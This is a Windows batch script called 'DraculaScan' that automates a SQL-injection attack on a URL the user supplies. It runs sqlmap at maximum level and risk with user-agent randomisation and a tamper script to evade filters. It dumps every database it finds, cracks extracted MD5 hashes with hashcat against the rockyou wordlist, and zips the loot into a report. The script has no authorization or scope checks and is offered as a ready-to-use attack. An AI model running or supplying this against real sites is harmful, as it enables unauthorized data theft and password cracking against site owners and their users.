@echo off
title 🦇 DraculaScan - Flipper Style Full Extraction Tool
color 0C

:: Prompt for URL
set /p target_url=Enter full target URL (e.g., https://example.com/page.php?id=1): 

:: Create folders
set output=dracula_logs
if not exist %output% mkdir %output%

:: Run sqlmap with aggressive stealth
echo [*] Starting Dracula Intelligence Sweep...
sqlmap.py -u "%target_url%" --level=5 --risk=3 --batch --random-agent --threads=5 --tamper=space2comment --os=Linux --technique=BEUSTQ --dbs --output-dir=%output%

:: Optional: extract tables and data from all DBs found
sqlmap.py -u "%target_url%" --dump-all --batch --random-agent --threads=4 --tamper=space2comment --output-dir=%output%

:: Start Hashcat on any extracted hashes (requires hashdump.txt)
echo [*] Starting hashcat crack attempt (if hashdump.txt exists)...
if exist hashdump.txt (
    hashcat -m 0 -a 0 hashdump.txt rockyou.txt -o cracked.txt
) else (
    echo [!] No hashdump.txt found. Skipping hashcat.
)

:: Zip results stealthily
echo [*] Creating DraculaReport.zip...
powershell -Command "Compress-Archive -Path '%output%\*' -DestinationPath 'DraculaReport.zip'"

echo [✔] Scan complete. Results in DraculaReport.zip
pause
